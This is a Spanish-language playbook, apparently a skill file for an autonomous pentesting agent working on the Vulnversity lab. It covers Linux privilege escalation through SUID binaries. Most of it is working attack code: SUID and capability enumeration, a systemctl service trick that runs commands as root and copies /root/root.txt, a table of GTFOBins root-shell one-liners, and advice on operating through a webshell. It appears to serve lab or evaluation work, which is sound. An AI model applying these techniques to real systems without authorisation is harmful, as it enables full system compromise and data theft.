---
name: privesc-suid
description: Escala a root desde una shell sin privilegios enumerando binarios SUID y abusando de GTFOBins (systemctl, find, vim, python, at).
---

# Escalar por SUID (GTFOBins)

Receta para cuando ya hay ejecución de comandos como usuario sin privilegios y
`sudo -n -l` falla. Medida en Vulnversity (2026-10-19): el agente tenía un RCE
como `www-data`, vio `/bin/systemctl` en la lista de SUID y gastó 35 turnos
compilando y transportando PwnKit por el webshell en lugar de usar el binario que
ya estaba en el objetivo. `systemctl` con SUID ejecuta un servicio como root.

## 1. Antes de escalar: loot primero

Con ejecución ya tienes la mitad del objetivo. No la cambies por una reverse
shell que no necesitas:

```bash
id
ls -la /home
cat /home/*/user.txt 2>/dev/null
```

Si `user.txt` aparece, regístralo como loot (`fact_type=loot`, key con la ruta).
`root.txt` necesita root; esa es la razón para escalar, no para estabilizar.

## 2. Enumera SUID y capabilities (una sola llamada)

```bash
find / -perm -4000 -type f 2>/dev/null | sort
getcap -r / 2>/dev/null
sudo -n -l 2>&1
cat /etc/crontab 2>/dev/null
```

Ignora los de la base (`su`, `mount`, `passwd`, `chsh`, `newgrp`, `pkexec` de
Ubuntu parcheado, `snap-confine`). Busca los que **no** deberían estar:
`systemctl`, `find`, `vim`, `awk`, `python3`, `perl`, `tar`, `at`, `env`,
`nmap`, `less`, `man`, `cp`, `tee`, `gdb`.

## 3. `systemctl` SUID (Vulnversity)

`/bin/systemctl` con el bit SUID permite crear un servicio que corre como root.
El servicio se escribe en `/tmp` (escribible por `www-data`) y se enlaza con
`systemctl link`:

```bash
TF=$(mktemp -d)
cat > "$TF/x.service" <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt; id > /tmp/rootid.txt; chmod 644 /tmp/rootid.txt"
[Install]
WantedBy=multi-user.target
EOF
/bin/systemctl link "$TF/x.service"
/bin/systemctl enable --now "$TF/x.service"
sleep 2
cat /tmp/rootid.txt   # uid=0(root) gid=0(root) groups=0(root)
cat /tmp/root.txt     # la flag (ruta con nombre convencional: cuenta como loot)
```

- No hace falta `sudo`, ni compilador, ni subir binarios.
- Si `enable --now` dice que la unidad no existe, revisa que `link` haya creado
  el symlink en `/etc/systemd/system/` (lo imprime).
- **Verificación**: `uid=0(root)` en la salida. Esa línea es el hecho
  `privilege`; `cat /tmp/root.txt` es el `loot` (la copia conserva el nombre
  `root.txt`, que es lo que el verificador reconoce). Copiar a
  `/tmp/rootproof.txt` o leerlo del journal (`journalctl`) también prueba el
  compromiso, pero no produce un hecho `loot` verificable.
- **Cleanup**: `/bin/systemctl disable x.service; rm -rf "$TF" /tmp/rootid.txt`.

## 4. Otros vectores SUID rápidos

| Binario | Comando |
| --- | --- |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python3` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `at` | `echo '/bin/sh </dev/tty >/dev/tty' \| at now +1 minute` |

Si el binario no está en GTFOBins con SUID, cambia de vector: no insistas.

## 5. Errores comunes (medidos)

- **Compilar PwnKit por el webshell**: el objetivo no tiene compilador ni red y
  el binario no cabe en un `curl` GET. `pkexec` de Ubuntu 20.04 parcheado no es
  vulnerable. Si aparece `/bin/systemctl` en SUID, ese es el camino.
- **Creer que hace falta una reverse shell**: un webshell de un comando por
  petición basta para `find`, `systemctl` y `cat`. Estabiliza solo si necesitas
  un TTY (por ejemplo `sudo -S`), no por costumbre.
- **Escribir el servicio en `/etc`**: `www-data` no puede; usa `mktemp -d` y
  `systemctl link`, que corre como root por el SUID.
- **No verificar**: sin `uid=0(root)` en la salida no hay escalada; un
  `ExecStart` que no arranca devuelve 0 y no prueba nada.
